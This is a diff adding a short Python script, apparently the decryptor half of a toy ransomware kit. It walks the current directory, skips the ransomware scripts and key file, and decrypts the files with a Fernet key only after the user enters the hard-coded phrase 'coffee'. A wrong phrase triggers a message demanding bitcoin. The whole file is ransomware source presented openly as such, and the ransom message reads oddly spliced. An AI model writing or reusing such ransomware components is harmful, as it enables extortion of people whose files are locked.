@@ -1,0 +1,36 @@
+#!/usr/bin/env python3
+# Let's decrypt some files
+
+import os
+from cryptography.fernet import Fernet
+
+files = []
+
+# List all files in the current directory
+for file in os.listdir():
+    if file == "ransomware_encrypt.py" or file == "ransomware_decrypt.py" or file == "thekey.key":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+
+print("Files to decrypt:", files)
+
+# Read the key file
+with open("thekey.key", "rb") as thekey:
+    secretkey = thekey.read()
+
+# Prompt for the secret phrase
+secret_phrase = "coffee"
+phrase = input("Enter the secret phrase: ")
+
+# Decrypt the files if the phrase matches
+if secret_phrase == phrase:
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read()  # Read the contents of the file
+        content_decrypted = Fernet(secretkey).decrypt(contents)  # Decrypt the contents
+        with open(file, "wb") as thefile:
+            thefile.write(content_decrypted)  # Write the decrypted content back
+    print("Decryption complete! Congrats, have a sip of coffee!")
+else:
+    print("Wrong phrase.send the bit coin Access denied!")
